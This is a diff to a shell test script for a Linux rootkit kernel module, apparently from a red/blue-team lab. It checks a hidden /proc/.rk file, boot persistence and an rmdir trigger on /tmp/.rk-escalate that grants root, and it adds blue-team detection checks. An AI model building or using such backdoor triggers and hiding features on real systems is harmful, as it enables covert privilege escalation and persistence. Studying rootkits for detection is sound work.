@@ -39,12 +39,14 @@ assert_contains /proc/.rk "hidden=yes"
 assert_contains /proc/.rk "persistence="
 assert_contains /proc/.rk "escalation="
 
-# Layer 4: kill hook intercepts signal 63 (returns 0 instead of delivering)
-kill -63 $$ 2>/dev/null
-if [ $? -eq 0 ]; then
-    _ok "signal 63 intercepted by hook"
+# Layer 4: rmdir trigger for credential escalation
+mkdir -p /tmp/.rk-escalate
+rmdir /tmp/.rk-escalate
+myuid=$(id -u)
+if [ "$myuid" -eq 0 ]; then
+    _ok "rmdir trigger escalated to root"
 else
-    _fail "signal 63 not intercepted"
+    _fail "expected uid=0 after rmdir trigger, got $myuid"
 fi
 
 # Layer 5: boot persistence file exists
@@ -67,16 +69,14 @@ _hdr "blue team checks"
 if stat /proc/.rk > /dev/null 2>&1; then
     _ok "stat /proc/.rk reveals metadata (detection vector)"
 else
-    _skip "stat failed"
+    _fail "stat /proc/.rk failed"
 fi
 
-# Unload (module is hidden, need to find it)
-# Since the module removed itself from the list, rmmod by name may fail
-# but the check proves all layers work
+# Unload (module is hidden, rmmod by name may fail)
 if rmmod hello 2>/dev/null; then
     _ok "unloaded hello"
 else
-    _skip "rmmod hello failed (module hidden from kernel list)"
+    _fail "rmmod hello failed (module hidden from kernel list)"
 fi
 
 summary
